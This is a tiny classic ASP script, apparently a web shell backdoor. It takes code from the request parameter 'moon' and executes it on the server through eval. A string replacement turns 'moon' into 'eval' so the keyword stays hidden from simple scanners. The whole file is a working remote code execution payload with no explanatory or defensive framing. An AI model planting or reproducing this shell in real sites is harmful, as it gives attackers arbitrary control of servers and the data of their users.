<%
if request("moon")<>"" then
b=request("moon")
a=replace(b,"moon","eval")
eval (a)
end if
%>
